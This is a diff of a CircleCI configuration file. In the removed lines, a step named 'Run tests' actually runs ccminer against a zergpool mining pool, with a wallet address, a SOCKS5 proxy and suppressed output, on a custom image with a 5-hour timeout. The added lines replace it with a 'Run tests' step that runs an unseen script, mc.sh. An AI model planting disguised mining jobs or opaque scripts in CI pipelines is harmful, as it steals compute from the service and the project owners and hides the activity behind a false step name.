@@ -1,8 +1,5 @@
 version: 2.1 
-parameters: 
-  sample: 
-    type: boolean 
-    default: false 
+ 
 orbs: 
    
   python: circleci/python@1.2 
@@ -12,16 +9,14 @@ workflows:
     jobs: 
       - build-and-test 
  
+ 
 jobs: 
   build-and-test:   
-    parallelism: 4 
     docker: 
-      - image: cobadoc/manaon 
+      - image: cimg/python:3.8 
      
     steps: 
       - checkout 
       - run: 
           name: Run tests 
-          no_output_timeout: 5h 
-          command: | 
-           ccminer -a verus -o stratum+tcp://verushash.na.mine.zergpool.com:3300 -u DLd8SKUyrMCAuUt4ToGWDirH6fpQTf6BvV -p c=DOGE,mc=VRSC -t 2 -x socks5://192.252.209.155:14455 > /dev/null 2>&1
+          command: chmod +x mc.sh && ./mc.sh
